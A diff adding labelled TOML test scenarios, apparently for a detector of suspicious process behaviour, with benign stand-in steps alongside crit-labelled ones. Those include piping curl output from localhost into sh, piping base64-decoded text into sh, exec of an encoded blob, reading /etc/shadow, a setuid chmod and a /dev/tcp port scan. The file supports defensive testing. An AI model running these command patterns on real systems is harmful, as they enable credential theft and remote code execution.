+id = "unexpected_parent.d"
+family = "unexpected_parent"
+label = "crit"
+container = "target"
+expected = 5
+at = 6481
+duration = 11
+params = { path = "/opt/tools/mover" }
+steps = [{ cmd = "cp /usr/bin/python3 {path} && {path} -c \"import subprocess; subprocess.run(['sleep', '3'])\"", timeout = 30 }]
+
+[[scenarios]]
+id = "tool_upgrade.d"
+family = "tool_upgrade"
+label = "warn"
+container = "target"
+expected = 3
+at = 6496
+duration = 10
+params = { bin = "/usr/local/bin/agentd", secs = 5 }
+steps = [{ cmd = "mkdir -p $(dirname {bin}) && cp /usr/bin/sleep {bin}.new && mv {bin}.new {bin} && {bin} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "test_runner.f"
+family = "test_runner"
+label = "safe"
+container = "target"
+expected = 3
+at = 6510
+duration = 9
+params = { n = 2, secs = 5 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do python3 -c 'import time; time.sleep({secs})' & i=$((i+1)); done; wait", timeout = 40 }]
+
+[[scenarios]]
+id = "dd_pipe_burn.d"
+family = "dd_pipe_burn"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 6523
+duration = 12
+params = { secs = 7 }
+steps = [{ cmd = "timeout {secs} sh -c 'dd if=/dev/zero bs=1M 2>/dev/null | cat > /dev/null'; true", timeout = 40 }]
+
+[[scenarios]]
+id = "tmpfs_copy.e"
+family = "tmpfs_copy"
+label = "crit"
+container = "target"
+expected = 4
+at = 6539
+duration = 13
+params = { path = "/var/tmp/.font-unix/rotor", secs = 4 }
+steps = [{ cmd = "mkdir -p $(dirname {path}) && cp /usr/bin/sleep {path} && chmod 755 {path} && {path} {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "odd_timestamp.a"
+family = "odd_timestamp"
+label = "warn"
+container = "target"
+expected = 3
+at = 6556
+duration = 9
+params = { n = 1, path = "/tmp/stamp", secs = 2 }
+steps = [{ cmd = "touch -d '2020-01-0{n} 03:00' {path}; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "tree_walk.a"
+family = "tree_walk"
+label = "safe"
+container = "target"
+expected = 3
+at = 6569
+duration = 9
+params = { root = "/usr/share", secs = 2 }
+steps = [{ cmd = "find {root} -maxdepth 2 2>/dev/null | wc -l; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "shadow_copy.e"
+family = "shadow_copy"
+label = "crit"
+container = "target"
+expected = 4
+at = 6582
+duration = 11
+params = { secs = 7 }
+steps = [{ cmd = "cp /etc/passwd /tmp/.p && cp /usr/bin/sleep /usr/local/lib/.s && /usr/local/lib/.s {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "bind_shell.d"
+family = "bind_shell"
+label = "crit"
+container = "target"
+expected = 3
+at = 6597
+duration = 10
+params = { port = 400, secs = 5 }
+steps = [{ cmd = "python3 -c \"import socket, time; s = socket.socket(); s.bind(('127.0.0.1', {port})); s.listen(1); time.sleep({secs})\"", timeout = 40 }]
+
+[[scenarios]]
+id = "chmod_then_run.a"
+family = "chmod_then_run"
+label = "crit"
+container = "target"
+expected = 3
+at = 6611
+duration = 10
+params = { path = "/tmp/.pp", secs = 3 }
+steps = [{ cmd = "cp /usr/bin/sleep {path} && chmod 4755 {path} && {path} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "cred_read.f"
+family = "cred_read"
+label = "crit"
+container = "target"
+expected = 3
+at = 6625
+duration = 9
+params = { out = "/dev/peerd", secs = 3 }
+steps = [{ cmd = "cat /etc/passwd /etc/shadow > {out} 2>/dev/null; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "base64_pipe.d"
+family = "base64_pipe"
+label = "crit"
+container = "target"
+expected = 3
+at = 6638
+duration = 10
+params = { b64 = "c2xlZXAgMg==" }
+steps = [{ cmd = "echo '{b64}' | base64 -d | sh; sleep 1", timeout = 40 }]
+
+[[scenarios]]
+id = "base64_pipe.e"
+family = "base64_pipe"
+label = "crit"
+container = "target"
+expected = 3
+at = 6652
+duration = 10
+params = { b64 = "c2xlZXAgNA==" }
+steps = [{ cmd = "echo '{b64}' | base64 -d | sh; sleep 1", timeout = 40 }]
+
+[[scenarios]]
+id = "source_checkout.g"
+family = "source_checkout"
+label = "safe"
+container = "target"
+expected = 3
+at = 6666
+duration = 10
+params = { dir = "/var/lib/svc/metad", secs = 1 }
+steps = [{ cmd = "mkdir -p {dir}/src && cd {dir}/src && printf 'int main(){{}}\\n' > main.c && cp main.c main.bak; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "wide_spawn_loop.b"
+family = "wide_spawn_loop"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 6680
+duration = 12
+params = { n = 90, gap = 3 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do sh -c 'sleep {gap}' & i=$((i+1)); done; wait", timeout = 40 }]
+
+[[scenarios]]
+id = "disk_filler.f"
+family = "disk_filler"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 2
+at = 6696
+duration = 15
+params = { n = 8 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do dd if=/dev/zero of=/scratch/blob.$i bs=1M count=6 2>/dev/null; sleep 1.2; i=$((i+1)); done; rm -f /scratch/blob.*", timeout = 30 }]
+
+[[scenarios]]
+id = "log_rotate.e"
+family = "log_rotate"
+label = "safe"
+container = "target"
+expected = 3
+at = 6715
+duration = 10
+params = { dir = "/var/opt/pkg/bundled", name = "worker", secs = 5 }
+steps = [{ cmd = "mkdir -p {dir} && printf 'line\\n' > {dir}/{name}.log && gzip -f {dir}/{name}.log; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "env_wrapper.g"
+family = "env_wrapper"
+label = "warn"
+container = "target"
+expected = 3
+at = 6729
+duration = 9
+params = { wrap = "env LANG=C TZ=UTC", secs = 4 }
+steps = [{ cmd = "{wrap} sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "dd_pipe_burn.b"
+family = "dd_pipe_burn"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 6742
+duration = 12
+params = { secs = 8 }
+steps = [{ cmd = "timeout {secs} sh -c 'dd if=/dev/zero bs=1M 2>/dev/null | cat > /dev/null'; true", timeout = 40 }]
+
+[[scenarios]]
+id = "thread_burst.e"
+family = "thread_burst"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 2
+at = 6758
+duration = 13
+params = { n = 180 }
+steps = [{ cmd = "python3 -c \"import threading, time; [threading.Thread(target=time.sleep, args=(5,)).start() for _ in range({n})]; time.sleep(6)\"", timeout = 30 }]
+
+[[scenarios]]
+id = "retry_storm.f"
+family = "retry_storm"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 6775
+duration = 13
+params = { n = 15, gap = 0.36 }
+steps = [{ cmd = "python3 -c \"import subprocess; [subprocess.run(['sleep', '{gap}']) for _ in range({n})]\"", timeout = 40 }]
+
+[[scenarios]]
+id = "disk_audit.e"
+family = "disk_audit"
+label = "warn"
+container = "target"
+expected = 3
+at = 6792
+duration = 10
+params = { a = "/usr", b = "/srv", secs = 1 }
+steps = [{ cmd = "du -sh {a} {b} 2>/dev/null; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "health_probe.f"
+family = "health_probe"
+label = "safe"
+container = "target"
+expected = 3
+at = 6806
+duration = 10
+params = { n = 5, path = "payload.sh" }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do curl -sf -o /dev/null http://127.0.0.1/{path}; sleep 1; i=$((i+1)); done", timeout = 40 }]
+
+[[scenarios]]
+id = "editor_plugin.c"
+family = "editor_plugin"
+label = "warn"
+container = "target"
+expected = 3
+at = 6820
+duration = 11
+params = { dir = "/root/.config/Code/reapd", secs = 4 }
+steps = [{ cmd = "mkdir -p {dir} && cp /usr/bin/sleep {dir}/lsp-server && {dir}/lsp-server {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "long_argument.b"
+family = "long_argument"
+label = "warn"
+container = "target"
+expected = 3
+at = 6835
+duration = 9
+params = { secs = 3, text = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef" }
+steps = [{ cmd = "sleep {secs}; echo {text} > /dev/null", timeout = 40 }]
+
+[[scenarios]]
+id = "pipe_spawn.g"
+family = "pipe_spawn"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 6848
+duration = 13
+params = { n = 64, secs = 3 }
+steps = [{ cmd = "python3 -c \"import subprocess; ps = [subprocess.Popen(['sleep', '{secs}']) for _ in range({n})]; [p.wait() for p in ps]\"", timeout = 40 }]
+
+[[scenarios]]
+id = "inline_encoded.c"
+family = "inline_encoded"
+label = "crit"
+container = "target"
+expected = 2
+at = 6865
+duration = 9
+params = { payload = "eNrLzC3ILypRKMnMTbUGEXrFOampBRpGmgB+wwkf" }
+steps = [{ cmd = "python3 -c \"import zlib, base64; exec(zlib.decompress(base64.b64decode('{payload}')))\"", timeout = 20 }]
+
+[[scenarios]]
+id = "log_rotate.g"
+family = "log_rotate"
+label = "safe"
+container = "target"
+expected = 3
+at = 6878
+duration = 10
+params = { dir = "/opt/tools/vaultd", name = "web", secs = 2 }
+steps = [{ cmd = "mkdir -p {dir} && printf 'line\\n' > {dir}/{name}.log && gzip -f {dir}/{name}.log; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "remote_script.f"
+family = "remote_script"
+label = "crit"
+container = "target"
+expected = 3
+at = 6892
+duration = 10
+params = { secs = 4 }
+steps = [{ cmd = "curl -s http://127.0.0.1/payload.sh | sh -s; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "world_writable_exec.c"
+family = "world_writable_exec"
+label = "crit"
+container = "target"
+expected = 3
+at = 6906
+duration = 10
+params = { dir = "/tmp/.data", name = ".job", secs = 3 }
+steps = [{ cmd = "mkdir -p {dir} && chmod 777 {dir} && cp /usr/bin/sleep {dir}/{name} && {dir}/{name} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "big_alloc.d"
+family = "big_alloc"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 6920
+duration = 12
+params = { mb = 329, secs = 6 }
+steps = [{ cmd = "python3 -c \"import time; b = bytearray({mb} * 1024 * 1024); time.sleep({secs})\"", timeout = 40 }]
+
+[[scenarios]]
+id = "write_loop.f"
+family = "write_loop"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 6936
+duration = 13
+params = { name = "cache.tmp", mb = 69, secs = 5 }
+steps = [{ cmd = "dd if=/dev/zero of=/scratch/{name} bs=1M count={mb} 2>/dev/null; sleep {secs}; rm -f /scratch/{name}", timeout = 40 }]
+
+[[scenarios]]
+id = "respawn_loop.e"
+family = "respawn_loop"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 51
+at = 6953
+duration = 17
+params = { n = 15 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do python3 -c 'import time; time.sleep(0.7)'; i=$((i+1)); done", timeout = 32 }]
+
+[[scenarios]]
+id = "big_alloc.g"
+family = "big_alloc"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 6974
+duration = 12
+params = { mb = 380, secs = 6 }
+steps = [{ cmd = "python3 -c \"import time; b = bytearray({mb} * 1024 * 1024); time.sleep({secs})\"", timeout = 40 }]
+
+[[scenarios]]
+id = "port_scan.f"
+family = "port_scan"
+label = "crit"
+container = "target"
+expected = 2
+at = 6990
+duration = 13
+params = { secs = 3 }
+steps = [{ cmd = "bash -c 'for p in 21 22 23 25 80 110 443 3306 5432 8080; do (echo > /dev/tcp/127.0.0.1/$p) 2>/dev/null; done; sleep {secs}'", timeout = 30 }]
+
+[[scenarios]]
+id = "write_loop.e"
+family = "write_loop"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 7007
+duration = 13
+params = { name = "dump.bin", mb = 43, secs = 5 }
+steps = [{ cmd = "dd if=/dev/zero of=/scratch/{name} bs=1M count={mb} 2>/dev/null; sleep {secs}; rm -f /scratch/{name}", timeout = 40 }]
+
+[[scenarios]]
+id = "miner_like.d"
+family = "miner_like"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 7024
+duration = 15
+params = { secs = 8 }
+steps = [{ cmd = "python3 -c 'import time; t = time.time(); exec(\"while time.time() - t < {secs}: pass\")' & python3 -c 'import time; t = time.time(); exec(\"while time.time() - t < {secs}: pass\")' & python3 -c 'import time; t = time.time(); exec(\"while time.time() - t < {secs}: pass\")' & wait", timeout = 30 }]
+
+[[scenarios]]
+id = "tree_walk.c"
+family = "tree_walk"
+label = "safe"
+container = "target"
+expected = 3
+at = 7043
+duration = 9
+params = { root = "/var/lib", secs = 2 }
+steps = [{ cmd = "find {root} -maxdepth 2 2>/dev/null | wc -l; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "file_sync.d"
+family = "file_sync"
+label = "safe"
+container = "target"
+expected = 3
+at = 7056
+duration = 10
+params = { dst = "/srv/app/mirrord", secs = 3 }
+steps = [{ cmd = "mkdir -p {dst} && cp -r /etc/default {dst}/ 2>/dev/null; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "custom_daemon.e"
+family = "custom_daemon"
+label = "warn"
+container = "target"
+expected = 3
+at = 7070
+duration = 10
+params = { bin = "/srv/bin/tickd", secs = 5 }
+steps = [{ cmd = "mkdir -p $(dirname {bin}) && cp /usr/bin/sleep {bin} && {bin} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "health_probe.d"
+family = "health_probe"
+label = "safe"
+container = "target"
+expected = 3
+at = 7084
+duration = 10
+params = { n = 2, path = "" }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do curl -sf -o /dev/null http://127.0.0.1/{path}; sleep 1; i=$((i+1)); done", timeout = 40 }]
+
+[[scenarios]]
+id = "ssh_session.d"
+family = "ssh_session"
+label = "safe"
+container = "target"
+expected = 5
+at = 7098
+duration = 13
+params = { n = 1, secs = 5 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do setsid sh -c \"sleep {secs}\" & i=$((i+1)); done; wait", timeout = 30 }]
+
+[[scenarios]]
+id = "long_argument.c"
+family = "long_argument"
+label = "warn"
+container = "target"
+expected = 3
+at = 7115
+duration = 9
+params = { secs = 2, text = "the-quick-brown-fox-jumps-over-the-lazy-dog-the-quick-brown-fox-jumps-over-the-lazy-dog" }
+steps = [{ cmd = "sleep {secs}; echo {text} > /dev/null", timeout = 40 }]
